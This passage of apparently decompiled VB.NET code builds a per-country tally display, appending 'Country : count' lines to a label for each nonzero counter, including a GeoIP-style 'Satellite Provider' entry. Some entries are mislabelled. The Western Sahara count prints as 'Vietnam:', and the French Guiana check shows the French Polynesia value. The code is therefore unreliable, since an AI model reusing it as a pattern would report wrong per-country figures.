        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Somalia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Somalia : ", Main.Somalia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SouthAfrica, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "South Africa : ", Main.SouthAfrica)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SouthGeorgiaandtheSouthSandwichIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "South Georgia and the South Sandwich Islands : ", Main.SouthGeorgiaandtheSouthSandwichIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Spain, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Spain : ", Main.Spain)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SriLanka, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Sri Lanka : ", Main.SriLanka)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Sudan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Sudan : ", Main.Sudan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Suriname, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Suriname : ", Main.Suriname)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SvalbardandJanMayen, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Svalbard and Jan Mayen : ", Main.SvalbardandJanMayen)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Swaziland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Swaziland : ", Main.Swaziland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Sweden, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Sweden : ", Main.Sweden)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Switzerland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Switzerland : ", Main.Switzerland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Syria, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Syria : ", Main.Syria)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Taiwan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Taiwan : ", Main.Taiwan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Tajikistan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Tajikistan : ", Main.Tajikistan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.UnitedRepublicofTanzania, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "United Republic of Tanzania : ", Main.UnitedRepublicofTanzania)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Thailand, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Thailand : ", Main.Thailand)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Togo, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Togo : ", Main.Togo)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Tokelau, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Tokelau : ", Main.Tokelau)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Tonga, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Tonga : ", Main.Tonga)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.TrinidadAndTobago, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Trinidad and Tobago : ", Main.TrinidadAndTobago)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Tunisia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Tunisia : ", Main.Tunisia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Turkey, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Turkey : ", Main.Turkey)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Turkmenistan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Turkmenistan : ", Main.Turkmenistan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.TurksandCaicosIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Turks and Caicos Islands : ", Main.TurksandCaicosIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Tuvalu, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Tuvalu : ", Main.Tuvalu)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Uganda, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Uganda : ", Main.Uganda)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Ukraine, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Ukraine : ", Main.Ukraine)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.UnitedArabEmirates, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "United Arab Emirates : ", Main.UnitedArabEmirates)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.UnitedKingdom, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "United Kingdom : ", Main.UnitedKingdom)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.UnitedStatesMinorOutlyingIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "United States Minor Outlying Islands : ", Main.UnitedStatesMinorOutlyingIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.UnitedStates, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "United States : ", Main.UnitedStates)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Uruguay, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Uruguay : ", Main.Uruguay)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Uzbekistan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Uzbek  istan : ", Main.Uzbekistan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Wales, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Wales : ", Main.Wales)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.WallisAndFutuna, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Wallis and Futuna : ", Main.WallisAndFutuna)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Vanuatu, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Vanuatu : ", Main.Vanuatu)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.VaticanCityState, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Vatican City State : ", Main.VaticanCityState)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Venezuela, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Venezuela : ", Main.Venezuela)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.WesternSahara, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Vietnam: ", Main.WesternSahara)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Vietnam, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Vietnam : ", Main.Vietnam)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.UnitedStatesVirginIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "United States Virgin Islands : ", Main.UnitedStatesVirginIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Yemen, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Yemen : ", Main.Yemen)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Zambia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Zambia : ", Main.Zambia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Zimbabwe, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Zimbabwe : ", Main.Zimbabwe)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CookIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cook Islands : ", Main.CookIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Antarctica, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Antarctica : ", Main.Antarctica)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Congo, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Congo : ", Main.Congo)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CoteDIvoire, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cote D'Ivoire : ", Main.CoteDIvoire)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SatelliteProvider, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Satellite Provider : ", Main.SatelliteProvider)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.AlandIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Aland Islands : ", Main.AlandIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Guernsey, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Guernsey : ", Main.Guernsey)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.IsleofMan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Isle of Man : ", Main.IsleofMan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Jersey, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Jersey : ", Main.Jersey)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaintBarthelemy, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Saint Barthelemy : ", Main.SaintBarthelemy)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Guinea, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Guinea : ", Main.Guinea)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Guatemala, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Guatemala : ", Main.Guatemala)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Guam, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Guam : ", Main.Guam)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Guadeloupe, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Guadeloupe : ", Main.Guadeloupe)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Grenada, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Grenada : ", Main.Grenada)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Greenland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Greenland : ", Main.Greenland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Greece, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Greece : ", Main.Greece)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Gibraltar, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Gibraltar : ", Main.Gibraltar)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Ghana, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Ghana : ", Main.Ghana)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Germany, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Germany : ", Main.Germany)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Georgia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Georgia : ", Main.Georgia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Gambia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Gambia : ", Main.Gambia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Gabon, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Gabon : ", Main.Gabon)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.FrenchSouthernTerritories, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "French Southern Territories : ", Main.FrenchSouthernTerritories)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.FrenchGuiana, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "French Polynesia : ", Main.FrenchPolynesia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.France, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "France : ", Main.France)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Finland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Finland : ", Main.Finland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Fiji, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Fiji : ", Main.Fiji)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.FaroeIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Faroe Islands : ", Main.FaroeIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Afghanistan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Afghanistan : ", Main.Afghanistan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Albania, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Albania : ", Main.Albania)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Algeria, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Algeria : ", Main.Algeria)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.AmericanSamoa, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "American Samoa : ", Main.AmericanSamoa)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Andorra, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Andorra : ", Main.Andorra)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Angola, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Angola : ", Main.Angola)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Anguilla, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Anguilla : ", Main.Anguilla)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.AntiguaandBarbuda, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Antigua and Barbuda", Main.AntiguaandBarbuda)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Argentina, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Argentina : ", Main.Argentina)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Armenia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Armenia : ", Main.Armenia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Aruba, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Aruba : ", Main.Aruba)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Australia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Australia : ", Main.Australia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Austria, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Austria : ", Main.Austria)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Azerbaijan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Azerbaijan : ", Main.Azerbaijan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Bahamas, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bahamas : ", Main.Bahamas)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Bahrain, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bahrain : ", Main.Bahrain)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Bangladesh, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bangladesh : ", Main.Bangladesh)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Barbados, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Barbados : ", Main.Barbados)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Belarus, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Belarus : ", Main.Belarus)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Belgium, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Belgium : ", Main.Belgium)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Belize, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Belize : ", Main.Belize)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Benin, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Benin : ", Main.Benin)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Bermuda, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bermuda : ", Main.Bermuda)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Bhutan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bhutan : ", Main.Bhutan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Bolivia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bolivia : ", Main.Bolivia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.BosniaandHerzegovina, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bosnia and Herzegovina : ", Main.BosniaandHerzegovina)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Botswana, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Botswana : ", Main.Botswana)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.BouvetIsland, 0, False))) Then
            label = Me.Label4
